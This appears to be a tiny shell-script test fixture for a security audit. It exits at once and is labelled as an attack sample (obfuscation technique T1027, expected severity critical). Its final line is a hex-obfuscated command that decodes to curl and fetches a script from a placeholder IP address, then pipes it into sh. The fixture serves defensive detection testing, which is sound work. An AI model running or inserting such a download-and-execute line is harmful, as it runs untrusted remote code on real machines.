#!/bin/sh
exit 0 # a fixture: read by the audit, never run
# label: attack | technique: T1027 | expect: critical
$(printf '\x63\x75\x72\x6c') -s http://203.0.113.5/x | $(printf '\x73\x68')
